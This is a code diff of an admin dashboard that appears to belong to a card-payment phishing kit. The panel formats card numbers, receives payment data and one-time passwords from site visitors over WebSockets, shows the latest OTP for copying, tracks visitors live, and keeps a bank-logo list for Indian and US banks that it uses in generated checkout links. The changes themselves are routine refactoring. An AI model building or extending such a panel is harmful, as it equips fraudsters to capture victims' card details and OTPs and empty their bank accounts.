@@ -1,16 +1,14 @@
-
 import React, { useState, useEffect } from 'react';
 import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
-import { io, Socket } from 'socket.io-client';
 import { useToast } from '@/hooks/use-toast';
-import { useSocket } from '../SocketContext';
+import { useSocket } from '@/context/SocketContext';
 import { v4 as uuidv4 } from 'uuid';
 import { api } from '../utils/api';
-import Analytics from '../components/Analytics';
+// import Analytics from '../components/Analytics';
 
 const formatCardNumber = (cardNumber: string) => {
   if (!cardNumber) return '';
@@ -171,6 +169,7 @@ const Admin = () => {
     console.log('🧹 Cleared stale visitor data from localStorage');
 
     if (socket && isConnected) {
+      console.log('🔗 Admin panel connected to WebSocket server');
       // Request all historical data
       socket.emit('admin-connected');
 
@@ -216,14 +215,14 @@ const Admin = () => {
     { name: 'ICICI Bank', logo: 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png' },
     { name: 'Axis Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg' },
     { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo-500x281.png' },
-    { name: 'Punjab National Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2023/01/punjab-national-bank-logo-pnb-freelogovectors.net_-400x225.png' },
+    { name: 'Punjab National Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/punjab-national-bank-logo.png' },
     // Kotak Bank - Multiple logos (randomly selected)
-    { name: 'Kotak Mahindra Bank', logo: 'https://logos-download.com/wp-content/uploads/2016/06/Kotak_Mahindra_Bank_logo-700x207.png' },
+    { name: 'Kotak Mahindra Bank', logo: 'https://logos-download.com/wp-content/uploads/2016/06/1500px-Logo_of_Kotak_Mahindra_Bank.png' },
     { name: 'Kotak Mahindra Bank', logo: 'https://upload.wikimedia.org/wikipedia/en/thumb/3/39/Kotak_Mahindra_Group_logo.svg/578px-Kotak_Mahindra_Group_logo.svg.png?20201116103707' },
     { name: 'Bank of India', logo: 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-India-logo-500x281.png' },
     { name: 'Federal Bank', logo: 'https://stickypng.com/wp-content/uploads/2023/07/627ccab31b2e263b45696aa2.png' },
     { name: 'Union Bank', logo: 'https://cdn.pnggallery.com/wp-content/uploads/union-bank-of-india-logo-01.png' },
-    { name: 'Bank of Maharashtra', logo: 'https://assets.stickpng.com/images/627cc5c91b2e263b45696a8e.png' },
+    { name: 'Bank of Maharashtra', logo: 'https://assets.stickpng.com/images/627cc5c1b2e263b45696a8e.png' },
     // Canara Bank - Multiple logos (randomly selected)
     { name: 'Canara Bank', logo: 'https://cdn.freelogovectors.net/svg10/canara-bank-logo-freelogovectors.net_.svg' },
     { name: 'Canara Bank', logo: 'https://images.seeklogo.com/logo-png/39/3/canara-bank-logo-png_seeklogo-397142.png' },
@@ -236,7 +235,7 @@ const Admin = () => {
     
     // US Banks
     { name: 'Chase Bank', logo: 'https://assets.stickpng.com/thumbs/60394382d4d69e00040ae03c.png' },
-    { name: 'Bank of America', logo: 'https://dwglogo.com/wp-content/uploads/2016/06/1500px-Logo-of-Bank-of-America.png' },
+    { name: 'Bank of America', logo: 'https://dwglogo.com/wp-content/uploads/2016/06/1500px-Logo_of_Bank_of_America.png' },
     { name: 'Citi Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/Citi-logo-500x281.png' },
     { name: 'Wells Fargo', logo: 'https://images.seeklogo.com/logo-png/24/2/wells-fargo-logo-png_seeklogo-242550.png' },
     { name: 'US Bank', logo: 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg' },
@@ -759,7 +758,18 @@ const Admin = () => {
   }, [visitorHeartbeats]);
 
   useEffect(() => {
-    if (!socket) return;
+    if (!socket) {
+      console.warn('⚠️ Socket not available in admin panel');
+      return;
+    }
+    
+    if (!isConnected) {
+      console.warn('⚠️ Socket not connected in admin panel');
+      // Still set up listeners for when connection is restored
+    }
+    
+    console.log('🔌 Setting up admin WebSocket event listeners');
+    
     try {
       // Listen for new payment data with error handling and instant display
       socket.on('payment-received', async (data: Omit<PaymentData, 'id' | 'status'>) => {
@@ -890,26 +900,7 @@ const Admin = () => {
         }
       });
 
-      // Listen for OTP submissions with error handling
-      socket.on('otp-submitted', (data: { otp: string; paymentId?: string; planData?: any }) => {
-        try {
-          if (!data || !data.otp) {
-            console.error('Invalid OTP data received:', data);
-            return;
-          }
-          
-          // Create new OTP entry
-          const newOtp: OtpData = {
-            paymentId: data.paymentId || 'payment-' + Date.now(),
-            otp: data.otp,
-            timestamp: new Date().toISOString()
-          };
-          setOtps(prev => [newOtp, ...prev.slice(0, 4)]); // Keep only last 5 OTPs
-          console.log('OTP received:', data.otp);
-        } catch (error) {
-          console.error('Error processing OTP data:', error);
-        }
-      });
+      // OTP event listener is handled below to avoid duplication
 
       // Listen for visitor join/leave events
       socket.on('visitor-joined', async (data: Omit<VisitorData, 'id'>) => {
@@ -1023,12 +1014,15 @@ const Admin = () => {
       });
 
       return () => {
+        // Clean up all event listeners to prevent memory leaks
         socket.off('payment-received');
         socket.off('payment-data');
         socket.off('otp-submitted');
         socket.off('visitor-joined');
         socket.off('visitor-heartbeat');
         socket.off('visitor-left');
+        socket.off('telegram-auto-config');
+        console.log('🧹 Cleaned up all admin WebSocket event listeners');
       };
     } catch (error) {
       console.error('Error initializing WebSocket connection:', error);
@@ -1231,7 +1225,7 @@ const Admin = () => {
     const getApiBaseUrl = () => {
       // In development (localhost), use port 3001 for backend
       if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-        return 'http://localhost:3001';
+        return 'http://localhost:3002';
       }
       // In production, use the same domain as frontend
       return window.location.origin;
@@ -1268,7 +1262,7 @@ const Admin = () => {
       if (result.success && result.hash) {
         const baseUrl = window.location.origin;
         // Add amount and currency as backup URL parameters for production reliability
-        const paymentLink = `${baseUrl}/checkout?plan=Custom&billing=custom&amount=${finalAmount}&currency=${paymentLinkCurrency}&${result.hash}`;
+        const paymentLink = `${baseUrl}/checkout?plan=Custom&billing=custom&amount=${finalAmount}&currency=${paymentLinkCurrency}&hash=${result.hash}`;
         console.log('🔗 Generated payment link with backup params:', paymentLink);
         setGeneratedLink(paymentLink);
         
@@ -1534,7 +1528,7 @@ const Admin = () => {
     }
 
     try {
-      const response = await fetch('http://localhost:3001/api/expire-payment-link', {
+      const response = await fetch('http://localhost:3002/api/expire-payment-link', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -1605,6 +1599,21 @@ const Admin = () => {
                   </SelectItem>
                 </SelectContent>
               </Select>
+            </div>
+            
+            {/* WebSocket Connection Status */}
+            <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2">
+              {isConnected ? (
+                <>
+                  <Wifi className="h-4 w-4 text-green-400" />
+                  <span className="text-sm text-green-400">Connected</span>
+                </>
+              ) : (
+                <>
+                  <WifiOff className="h-4 w-4 text-red-400" />
+                  <span className="text-sm text-red-400">Disconnected</span>
+                </>
+              )}
             </div>
             
             {/* Telegram Status */}
@@ -1793,7 +1802,7 @@ const Admin = () => {
                   </label>
                   <Select value={paymentLinkCurrency} onValueChange={setPaymentLinkCurrency}>
                     <SelectTrigger className="bg-gray-800 border-gray-600 text-white h-12">
-                      <SelectValue />
+                      <SelectValue placeholder="Choose currency" />
                     </SelectTrigger>
                     <SelectContent className="bg-gray-800 border-gray-600">
                       <SelectItem value="INR" className="text-white hover:bg-gray-700">
@@ -1830,7 +1839,7 @@ const Admin = () => {
                   <Input
                     value={generatedLink}
                     readOnly
-                    className="bg-gray-700 border-gray-600 text-white font-mono text-sm h-12 flex-1"
+                    className="bg-gray-700 border-gray-600 text-white font-mono text-sm flex-1"
                   />
                   <Button
                     onClick={() => copyToClipboard(generatedLink)}
@@ -1977,7 +1986,7 @@ const Admin = () => {
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap">
                         <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
-                          <div className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></div>
+                          <div className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></div>
                           Online
                         </span>
                       </td>
@@ -2016,7 +2025,9 @@ const Admin = () => {
               {/* OTP Display Area */}
               {otps.length > 0 && (
                 <div className="bg-blue-900 rounded-lg p-3 sm:p-4 border border-blue-700 w-full sm:w-auto">
-                  <h3 className="text-blue-300 font-medium mb-2 text-sm sm:text-base">Latest OTP</h3>
+                  <h3 className="text-lg font-medium text-white border-b border-gray-700 pb-2">
+                    Latest OTP
+                  </h3>
                   <div className="flex items-center gap-3 justify-between sm:justify-start">
                     <span className="text-xl sm:text-2xl font-bold text-blue-100 bg-blue-800 px-3 py-1 rounded font-mono">
                       {otps[0].otp}
@@ -2025,9 +2036,9 @@ const Admin = () => {
                       variant="ghost"
                       size="sm"
                       onClick={() => copyToClipboard(otps[0].otp)}
-                      className="h-8 w-8 p-0 text-blue-300 hover:text-blue-100"
+                      className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
                     >
-                      <Copy className="h-4 w-4" />
+                      <Copy className="h-3 w-3" />
                     </Button>
                   </div>
                   <p className="text-xs text-blue-400 mt-1">
@@ -2816,11 +2827,10 @@ const Admin = () => {
         {/* Analytics Tab */}
         {activeTab === 'analytics' && (
           <div className="bg-gray-900 rounded-lg p-6">
-            <Analytics 
-              socket={socket} 
-              globalCurrency={globalCurrency} 
-              exchangeRate={exchangeRate} 
-            />
+            <div className="text-white text-center p-8">
+              <h3 className="text-xl mb-4">Analytics Coming Soon</h3>
+              <p>Analytics component temporarily disabled</p>
+            </div>
           </div>
         )}
 
@@ -2915,7 +2925,7 @@ const Admin = () => {
                   </div>
                 )}
               </div>
-　　 　 　 　 {/* Manual Expiration Section */}
+　　 　 　 {/* Manual Expiration Section */}
               <div className="space-y-4">
                 <h3 className="text-lg font-medium text-white border-b border-gray-700 pb-2">
                   Manually Expire Payment Link
